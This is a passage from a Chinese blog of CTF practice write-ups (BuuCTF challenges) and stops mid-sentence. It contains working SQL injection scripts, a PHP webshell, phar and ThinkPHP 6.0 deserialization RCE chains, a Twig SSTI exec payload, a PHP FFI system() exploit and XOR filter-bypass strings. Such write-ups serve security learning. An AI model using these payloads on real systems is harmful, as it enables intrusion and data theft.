然后就直接getshell了, 这不是题目的本意, 继续看看 可以查到perl有个open命令的漏洞 而GET底层是用了open实现, 那就可以绕过了 而且有一说一, 这个GET命令是真的顶 1?url=/&amp;filename=test8.php 这样就可以直接读目录了, 读文件读目录无所不能?? 太神奇了 参考 https://www.jianshu.com/p/3f82685f56a8 然后利用open的命令执行, 12/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|/?url=file:bash%20-c%20/readflag|&amp;filename=2 另外还有CVE-2016-1238, 这个也很骚, 不过懒得再去开linux_labs就不重现了 [极客大挑战 2019]HardSQL报错注入, 绕过过滤的方法如下 =&gt; () = =&gt; like 然后就可以顺利注出表名和列名 1-1&apos;^(updatexml(1,concat(0x7e,(SELECT(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database()))),0x7e),1))^&apos;1 这里可以看到在拿flag的时候出现了长度不够 1-1&apos;^(updatexml(1,concat(0x7e,(SELECT((group_concat(password)))from(H4rDsq1)),0x7e),1))^&apos;1 加上个reverse即可 1-1&apos;^(updatexml(1,concat(0x7e,(SELECT(reverse(group_concat(password)))from(H4rDsq1)),0x7e),1))^&apos;1 手动拼接即可得到flag [LCTF 2018]bestphp’s revengeindex.php 123456789101112&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'], $_POST);session_start();if (isset($_GET['name'])) &#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');call_user_func($b, $a);?&gt; flag.php 1234567session_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;*************************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123; $_SESSION['flag'] = $flag; &#125;only localhost can get flag! 源码如上, 大概的想法是通过 1call_user_func($_GET[&apos;f&apos;], $_POST); 这一行进行变量覆盖, 然后在最后一行执行代码 首先尝试将$b覆盖成var_dump 但是这里失败了, 不太懂为什么没有覆盖成功 查了一下相应的wp, 也是用的extract, 这就很迷了 lctf2018-bestphps-revenge-详细题解 推荐一下smi1e师傅的wp, 以下直接引用部分 我们可以看到代码中的session_start()十分突兀, 可以说没有啥用, 那应该就是突破口, 在php中, session的存储位置是在文件中, 并且有一次反序列化的过程, 这就有了session反序列化的漏洞 php的反序列化引擎有三种 php: 1name|s:5:&quot;Smi1e&quot;; php_serialize: 1a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;Smi1e&quot;;&#125; php_binary: 1&lt;0x04&gt;names:5:&quot;Smi1e&quot;; 可以看到不同的引擎的反序列化方式不同, 类似于反序列化字符串逃逸, 如果使用了不同的引擎, 也可能出现反序列化逃逸, 例如 1a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125; 在php引擎中会从|分隔, a:1:{s:4:&quot;name&quot;;s:5:&quot;作为key, O:5:&quot;Smi1e&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;}&quot;;}作为value, 最后会把它进行unserialize处理, 这就出现了漏洞 但是空有漏洞也没有用, 我们需要对flag.php进行ssrf, 由于题目没有类对象, 我们需要从原生的类入手 https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0 可以看到SoapClient类就符合这个特点, 所以这里的思路就是 生成SoapClient的payload 先设置为php_serialize引擎, 将payload注入 再次访问, 调用SoapClient类中不存在的方法, 触发__call__, 从而实现ssrf 一步步来, 首先是生成payload 123456&lt;?php $path = \"http://127.0.0.1/flag.php\"; $o = new SoapClient(null, array('uri' =&gt; $path, 'location' =&gt; $path)); $payload = serialize($o); echo \"|\".$payload; 生成 1|O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:13:&quot;_soap_version&quot;;i:1;&#125; 然后访问 再利用call_user_func的特性, 当传入的第一个参数为数组时, 数组的第一个元素作为类名, 第二个元素为方法 这里的访问就是 1call_user_func(array(&quot;SoapClient&quot;, &quot;welcome_to_the_lctf2018&quot;)); 就会触发__call__, 实现ssrf 最后访问index.php, 将获取到的session填入cookie即可 签到题都这么有水平, lctf太顶了 [RoarCTF 2019]Online Proxy 可以看到有ip, 那么有几种可能 SSTI 命令注入 sql注入 结合文字应该就是sql注入了, 不过这里注入的情况比较特别, 需要三次访问才会出结果 访问, 程序记录IP 第二次访问, 如果不同, 则将上次的IP放入数据库 第三次访问, 如果与第二次相同, 则从数据库查询上次的IP 这就是二次注入了, 脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import requestsimport refrom time import sleepurl = \"http://node3.buuoj.cn:25528/\"proxies = &#123; \"http\": \"127.0.0.1:8080\"&#125;static_headers = &#123; \"X-Forwarded-For\": \"111\",&#125;session = requests.Session()def test(cur, mid): # table: F4l9_D4t4B45e payload = \"-1' and (ascii(substr((select reverse(group_concat(schema_name)) from information_schema.schemata),%d,1))&gt;%d)^'0\" % (cur, mid) # table: F payload = \"-1' and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='F4l9_D4t4B45e'),%d,1))&gt;%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='F4l9_D4t4B45e'),%d,1))&gt;%d)^'0\" % (cur, mid) payload = \"-1' and (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&gt;%d)^'0\" % (cur, mid) headers = &#123; \"X-Forwarded-For\": payload, &#125; res = session.get(url, headers=headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5) res = session.get(url, headers=static_headers, timeout=5).text # print(res) result = re.findall(\"(?&lt;=Last Ip:\\s).+\\s\", res)[0].strip() if result == \"1\": return True return False # print(result)def main(): flag = \"\" for i in range(45, 80): end = 127 start = 31 mid = (end + start) // 2 while end &gt; start: if test(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.3) flag += chr(mid) print(flag)if __name__ == \"__main__\": # attack() # test() main() 依次注入就完事了, 注意一下sleep的时间, 不然容易断 [极客大挑战 2019]FinalSQL也是个盲注题, 而且最后的flag位置特别靠后, 建议还是活用reverse() 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsimport refrom time import sleepfrom urllib.parse import urlencodeurl = \"http://49029690-686c-4f70-816f-a017071f77c6.node3.buuoj.cn/search.php\"proxies = &#123; \"http\": \"127.0.0.1:8080\"&#125;session = requests.Session()def test(cur, mid=\"\"): # table: F4l9_D4t4B45e payload = \"0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(table_name)))from(information_schema.tables)),%d,1))&gt;%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(reverse(group_concat(column_name)))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)\" % (cur, mid) payload = \"0^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)\" % (cur, mid) res = session.get(f\"&#123;url&#125;?id=&#123;payload&#125;\", timeout=5).text if \"Click\" in res: return True return False # print(result)def main(): flag = \"\" for i in range(172, 220): end = 127 start = 31 mid = (end + start) // 2 while end &gt; start: if test(i, mid): start = mid + 1 else: end = mid mid = (end + start) // 2 sleep(0.05) flag += chr(mid) print(flag)if __name__ == \"__main__\": # attack() # test() main() [ByteCTF 2019]EZCMS第一步是hash拓展攻击 先随便登录一下, 可以在cookie中看到 1hash=52107b08c0f3342d2153ae1d68e6262c 翻一下源码, 这里是 12$secret = \"E3ry7Hjq\";setcookie(\"hash\", md5($secret.\"adminadmin\")); 在验证的地方, 验证 1234567891011function is_admin()&#123; $secret = \"E3ry7Hjq\"; $username = $_SESSION['username']; $password = $_SESSION['password']; if ($username == \"admin\" &amp;&amp; $password != \"admin\")&#123; if ($_COOKIE['user'] === md5($secret.$username.$password))&#123; return 1; &#125; &#125; return 0;&#125; 那么只需要在hashpump里面 然后替换成% 1admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin 登陆后就是admin了 然后继续看源码, 这道题不难看出是个构造pop链的题, 可以看到在config.php里面 File类存在一个__destruct 里面会调用check-&gt;upload_file 在Profile类中存在一个__call函数, 可以调用admin-&gt;open, 那么如果我们能找到某个类的open可以删除文件, 也就是程序默认生成的.htaccess, 就可以RCE了, 这个类就是ZipAchrive https://www.anquanke.com/post/id/95896#h2-4 现在，我们在本地去测试每个类的行为。经过一段时间的测试之后，我发现，ZipArchive-&gt;open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。 为什么要设定为9呢？原因在于， ZipArchive-&gt;open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢@pagabuc帮助我们解释了这一参数的具体意义。 那么现在，我们就可以使用ZipArchive-&gt;open()来删除.htaccess文件。 构造链如下 1File -&gt; __destruct -&gt; Profile -&gt; upload_file(不存在) -&gt; __call -&gt; ZipArchive -&gt; open 生成的脚本 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass File&#123; public $filename; public $filepath; public $checker;&#125;class Admin&#123; public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check;&#125;class Profile&#123; public $username = \"/var/www/html/sandbox/2c67ca1eaeadbdc1868d67003072b481/.htaccess\"; public $password = \"9\"; public $admin;&#125;$z = new ZipArchive();$p = new Profile();$p-&gt;admin = $z;$f = new File();$f-&gt;checker = $p;unlink(\"1.phar\");$phar = new Phar(\"1.phar\"); //后缀名必须为phar$phar-&gt;startBuffering();// &lt;?php __HALT_COMPILER();$phar-&gt;setStub(\"GIF89a\" . \"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub$phar-&gt;setMetadata($f); //将自定义的meta-data存入manifest$phar-&gt;addFromString(\"test.txt\", \"test\"); //签名自动计算$phar-&gt;stopBuffering(); 对于如何绕过phar协议的过滤可以看这篇文章 https://blog.zeddyu.info/2019/08/24/SUCTF-2019/#php-filter zedd师傅的文章都写的很好 通过php伪协议来绕过 1php://filter/read=convert.base64-encode/resource=phar:// 而这里恰好有一个触发的函数 那么就可以开始了 生成webshell, 由于eval无法动态构造, 这里就直接这样了 123&lt;?php ($_GET['a'])($_GET['b']);?&gt; 上传webshell 生成我们的phar文件并上传 访问view.php, 这里需要注意phar文件的路径 1http://078e3606-5996-4c33-9dff-00db1aaa228f.node3.buuoj.cn/view.php?filename=eec2d95bc618625503306c10fad5d37d.phar&amp;filepath=php://filter/resource=phar://./sandbox/2c67ca1eaeadbdc1868d67003072b481/eec2d95bc618625503306c10fad5d37d.phar rce [BJDCTF2020]Cookie is so stable这道题以为他用的是smarty, 还以为他的这句话是用了waf 测了半天发现不靠谱, 原来这是个twig 上网抄个payload就可以直接打了…. 具体可以看这里 一篇文章带你理解漏洞之SSTI漏洞 1&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125; 果然还是要测一测是什么引擎先 [BJDCTF2020]EasySearch123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(\"Content-Type: text/html;charset=utf-8\"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) &#123; $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) &#123; echo \"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt; *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; &#125; else &#123; echo \"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;\"; &#125;else &#123; *** &#125; ***?&gt; 跑(抄)出来的md5是 12020666 后面利用的是apache的ssi漏洞注入 SSI注入漏洞总结 flag在上一层 [BJDCTF2020]EzPHP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phphighlight_file(__FILE__);error_reporting(0); $file = \"1nD3x.php\";$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo \"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;\";if($_SERVER) &#123; if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); &#125;if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br&gt;\"; &#125; &#125; else die('fxck you! What do you want to do ?!');if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; if (file_get_contents($file) !== 'debu_debu_aqua') die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\");if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET[\"flag\"]); echo \"Very good! you know my password. But what is flag?&lt;br&gt;\";&#125; else&#123; die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");&#125;if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123; die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123; include \"flag.php\"; $code('', $arg); &#125; ?&gt; 绕过 1preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING']) url编码即可 绕过 1234if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!&lt;br&gt;\"; &#125; 因为正则没有/g, 添加一个%0a就可以绕过了 绕过 123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; 这里的话是利用POST参数来覆盖GET参数, 我们知道POST和GET的参数是分别放在不同的数组的, 但是在$_REQUEST中, 是合并在一起的, 并且优先级如下 1GET&lt;POST 绕过 12if (file_get_contents($file) !== 'debu_debu_aqua') die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;\"); data协议, 老考点了 1data://text/plain;data 绕过 1if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ) 记得好像见过sha1碰撞的, 暂时找不到了, 这里直接用数组就可以了 到这一步的payload是 123POST /1nD3x.php?file=data:text/plain;base64,%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%73%68%61%6e%61[]=&amp;%70%61%73%73%77%64[]=1&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a file=1&amp;shana=1&amp;password=1&amp;debu=1 绕过 12345678extract($_GET[\"flag\"]);if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) &#123; die(\"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); &#125; else &#123; include \"flag.php\"; $code('', $arg); &#125; ?&gt; 利用前面给的extract赋值变量, 然后利用create_function绕过即可 这里有很多解决方法, 具体可以看 https://www.gem-love.com/websecurity/770.html 调的很暴躁 123POST /1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=create_function&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//file=1&amp;shana=1&amp;password=1&amp;debu=1&amp;flag=1 [BJDCTF2020]ZJCTF，不过如此这名字听起来怪怪的 首先是data协议和伪协议读源码, 第二步是preg_replace的命令执行, 主要是怎么让正则匹配到 payload如下 1\\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(&apos;cat /flag&apos;) \\S表示匹配非空白字符, 简单测一下就可以知道php会替换某些字符 比如这里的.就被替换了, 就由于有特殊字符就不能用\\w, 所以用了\\S [安洵杯 2019]iamthinking测一下版本, 是tp6.0 掏出payload就是打 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpnamespace think &#123; use think\\model\\concern\\Attribute; use think\\model\\concern\\Conversion; use think\\model\\concern\\RelationShip; abstract class Model &#123; use Conversion; use RelationShip; use Attribute; private $lazySave; protected $table; public function __construct($obj) &#123; $this-&gt;lazySave = true; $this-&gt;table = $obj; $this-&gt;visible = array(array('hu3sky'=&gt;'aaa')); $this-&gt;relation = array(\"hu3sky\"=&gt;'aaa'); $this-&gt;data = array(\"a\"=&gt;'cat /flag'); $this-&gt;withAttr = array(\"a\"=&gt;\"system\"); &#125; &#125;&#125;namespace think\\model\\concern &#123; trait Conversion &#123; protected $visible; &#125; trait RelationShip &#123; private $relation; &#125; trait Attribute &#123; private $data; private $withAttr; &#125;&#125;namespace think\\model &#123; class Pivot extends \\think\\Model &#123; &#125;&#125;namespace &#123; $a = new think\\model\\Pivot(''); $b = new think\\model\\Pivot($a); echo urlencode(serialize($b));&#125; 后面再具体分析一下tp各个版本的rce吧 另外注意一下有个地方需要绕过, 参考飘零师傅的 parse-url函数小记 [CSAWQual 2016]i_got_id看到perl就猜测是open的漏洞了 https://tsublogs.wordpress.com/2016/09/18/606/ 具体的分析可以看上面, 不过我测了一下里面的payload似乎用不了, 当然我们可以直接读文件 1/flag RCE的话通过以下的方式, 但是这里不太理解为什么|前要跟个空格才行 1cat%20/flag%20| [RCTF 2019]Nextphp还是以这道题作为这篇的结尾吧, 挺怀念的 先看phpinfo 可以看到是7.4版本, 这就很灵性了, 当时最新的stable才到7.3 disable_function应该都过滤完了, 这里的题意是用php7.4的新特性解题 https://stitcher.io/blog/new-in-php-74 这里主要运用的有两个 预加载 而回到phpinfo, 搜索一下preload会看到 读一下源码 1readfile(&quot;preload.php&quot;); 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpfinal class A implements Serializable &#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'print_r', 'arg' =&gt; '1' ]; private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception('No implemented'); &#125; public function __construct () &#123; throw new \\Exception('No implemented'); &#125;&#125; 可以看到run方法 123private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; 是不是很像我们需要的东西, 有类, 又有执行点, 反序列化可控, 但是由于命令被限制open_basedir, 无法绕过 FFI https://wiki.php.net/rfc/ffi 直接看rfc的文档, 看到FFI可以调用c的函数, 这就很神奇了, 我们可以调用c的system, 从而执行命令, 先找一下system的原型 https://www.tutorialspoint.com/c_standard_library/c_function_system.htm 然后构造exp 123456789101112131415161718192021&lt;?phpclass A implements Serializable &#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'FFI::cdef', 'arg' =&gt; 'int system(const char *command);' ]; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __construct () &#123; &#125;&#125;$a = new A();echo urlencode(serialize($a)); 然后就反序列化再利用即可, payload如下 1a=$a%3dunserialize(&apos;C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D&apos;)-&gt;ret;var_dump($a-&gt;system(&quot;cat%20/flag&gt;b.txt&quot;)); 第二篇结束了, 后面尽量刷一些质量更高的题吧","link":"/2020/02/14/BuuCTF刷题记录2/"},{"title":"Buu刷题记录3","text":"继续刷题了 [ISITDTU 2019]EasyPHP先看源码 123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET['_'];if ( preg_match('/[\\x00- 0-9\\'\"`$&amp;.,|[&#123;_defgops\\x7F]+/i', $_) ) die('rosé will not do it');if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die('you are so close, omg');eval($_);?&gt; 题目类似于[SUCTF 2019] EasyWeb 但是过滤了${, 原来的payload不能用了, 老实讲我觉得这道题是道算法题 1如何通过尽量少的字符异或出任意字符串 可以看到最大的字符数为13, 而除去必须的()^;, 只有9个空间, 也就是通过9个数来表示[a-z_] 有一说一, 如果能通过算法解出来最小值, 这个就可以出新题了hhhh而且是骂人的那种 首先执行phpinfo(), 这个很简单, 只需要异或一下就可以了 1(~%8F%97%8F%96%91%99%90)(); 然后会看到disable_function有很多, 盲猜是列全了, 那么就是像[Bytectf 2019] boring code那样执行函数了, 首先尝试执行下面的payload 1print_r(scandir(.)); 下面的方法大体来自 https://blog.zeddyu.info/2019/07/20/isitdtu-2019/#Another-Way-Step-3, 只是暴力很多提出需要用的字符 1acdinpsrt._ 然后测试一下他们之间有怎么的异或关系, 注意只要找奇数次异或的结果 1234567891011121314151617181920212223find_word = \"acdinpsrt._\"word = \"acdinpsrt._\"out_set = set()def not_eq(i, j, k): if i != j and i != k and j !=k: return True return Falsedef word_sum(i, j, k): num = ord(i) * ord(j) * ord(k) if num not in out_set: out_set.add(num) return True return Falsef = open(\"out\", \"w\")for a in find_word: for i in word: for j in word: for k in word: if (ord(a) == ord(i)^ord(j)^ord(k)) and not_eq(i, j, k) and word_sum(i, j, k): res = (f\"&#123;a&#125; = &#123;i&#125;^&#123;j&#125;^&#123;k&#125;\") f.write(res + \"\\n\") print(res) 输出如下 12345678910111213141516a = c^p^rc = a^p^rc = d^i^nc = d^s^td = c^i^nd = c^s^ti = c^d^ni = n^s^tn = c^d^in = i^s^tp = a^c^rs = c^d^ts = i^n^tr = a^c^pt = c^d^st = i^n^s 这里需要灵性选择一部分来用, 我选择将出现一次的尽量使用出现多次的代替 这里出现比较多的有 1rin 可以得到如下关系 123s = i^n^td = c^i^na = c^p^r 然后我们就可以开始构造了 123print_r = %ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8dscandir = iccncir^ncpniir^tcrnnir = %ff%ff%ff%ff%ff%ff%ff^^%96%9c%9c%91%9c%96%8d^%91%9c%8f%91%96%96%8d^%8b%9c%8d%91%91%96%8d. = %ff^%d1 拼起来 1_=(%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d)((%ff%ff%ff%ff%ff%ff%ff^%96%9c%9c%91%9c%96%8d^%91%9c%8f%91%96%96%8d^%8b%9c%8d%91%91%96%8d)((%ff^%d1))); 天可怜见, 终于看到文件了 1print_r(file(end(scandir(&quot;.&quot;)))); 然后继续构造, 提取字符 1acedfilnpsrt._ 先根据上面提出的替换 123s = i^n^td = c^i^na = c^p^r 再从输出提取下面的替换, 这里还是需要灵性 123e = c^r^tl = n^p^r. = c^t^f^_ 然后写出payload 12345print_r = %ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8dfile = fibc^fipr^firt = %ff%ff%ff%ff^%99%96%9d%9c^%99%96%8f%8d^%99%96%8d%8bscandir = %ff%ff%ff%ff%ff%ff%ff^%96%9c%9c%91%9c%96%8d^%91%9c%8f%91%96%96%8d^%8b%9c%8d%91%91%96%8dend = cnc^rni^tnn = %ff%ff%ff^%9c%91%9c^%8d%91%96^%8b%91%91. = %ff^%9c^%8b^%99^%a0 写了个生成某个串的脚本 1234567891011121314151617181920212223242526272829303132import redef xor(start, payload): pattern = re.compile('[\\x00- 0-9\\'\"`$&amp;.,|[&#123;_defgops\\x7F]+', re.I) for i in range(start, start + 1): if pattern.match(chr(i)): continue res = f\"%&#123;i:02x&#125;\" * len(payload) res += \"^\" f = False for j in payload: new = ord(j)^i if pattern.match(chr(new)): f = True break res += f\"%&#123;ord(j)^i:02x&#125;\" if f: continue return resdef xor_plus(payload): res = \"\" lens = 0 for i in payload.split(\"^\"): lens = len(i) res += \"^\" res += xor(0xff, i).split(\"^\")[1] res = \"%ff\" * lens + res print(res)if __name__ == \"__main__\": # print(xor(0xff,\".\")) xor_plus(\"i^n^p^t^_^r\") 拼起来 1(%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d)((%ff%ff%ff%ff^%99%96%9d%9c^%99%96%8f%8d^%99%96%8d%8b)((%ff%ff%ff^%9c%91%9c^%8d%91%96^%8b%91%91)((%ff%ff%ff%ff%ff%ff%ff^%96%9c%9c%91%9c%96%8d^%91%9c%8f%91%96%96%8d^%8b%9c%8d%91%91%96%8d)((%ff^%9c^%8b^%99^%a0))))); 本地测试发现14…., 继续构造, 改进前面的脚本, 增加多几次异或 1234567891011121314151617181920212223242526find_word = \"cfinprt._\"word = \"cfinprt_\"out_set = set()def not_eq(*arg): if len(arg) != len(set(arg)): return False return True def word_sum(i, j, k, l, m): num = ord(i) * ord(j) * ord(k) * ord(l) * ord(m) if num not in out_set: out_set.add(num) return True return Falsef = open(\"out\", \"w\")for a in find_word: for i in word: for j in word: for k in word: for l in word: for m in word: if (ord(a) == ord(i)^ord(j)^ord(k)^ord(l)^ord(m)) and not_eq(i, j, k, l, m) and word_sum(i, j, k,l, m): res = (f\"&#123;a&#125; = &#123;i&#125;^&#123;j&#125;^&#123;k&#125;^&#123;l&#125;^&#123;m&#125;\") f.write(res + \"\\n\") print(res) 终于找到了多的替换 123456c = f^i^n^p^rf = c^i^n^p^ri = c^f^n^p^rn = c^f^i^p^rp = c^f^i^n^rr = c^f^i^n^p 这里选择f, 出现次数最少, 需要改的地方比较少, 修改后的替换表如下 1234567s = i^n^td = c^i^na = c^p^re = c^r^tl = n^p^r. = i^n^p^r^t^_f = c^i^n^p^r payload 12345print_r = %ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8dfile = cinc^iipr^nirt^pirt^rirt = %ff%ff%ff%ff^%9c%96%91%9c^%96%96%8f%8d^%91%96%8d%8b^%8f%96%8d%8b^%8d%96%8d%8bscandir = %ff%ff%ff%ff%ff%ff%ff^%96%9c%9c%91%9c%96%8d^%91%9c%8f%91%96%96%8d^%8b%9c%8d%91%91%96%8dend = cnc^rni^tnn = %ff%ff%ff^%9c%91%9c^%8d%91%96^%8b%91%91. = %8b^%a0^%96^%91^%8f^%8d 最后payload 